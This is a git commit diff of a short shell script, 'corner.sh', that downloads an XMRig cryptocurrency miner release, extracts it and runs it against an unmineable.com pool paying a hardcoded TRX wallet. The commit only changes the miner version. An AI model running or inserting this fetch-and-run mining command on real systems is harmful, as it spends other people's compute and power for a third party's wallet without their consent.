820e48911eb1092eefa8d783c2d3f5da5e59fb48
AndevaX <149788446+AndevaX@users.noreply.github.com>
2024-01-11 15:00:26 +0100

    Update corner.sh

--- corner.sh
+++ corner.sh
@@ -1,2 +1,2 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz && tar -xvf xmrig-6.21.0-linux-x64.tar.gz && cd xmrig-6.21.0 && ./xmrig -o 
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o 
 rx.unmineable.com:3333 -a rx -k -u TRX: TQLe8UFEoEtPzH9eV7AQwcSg7osCHZ8EbJ.Cornertech -p x
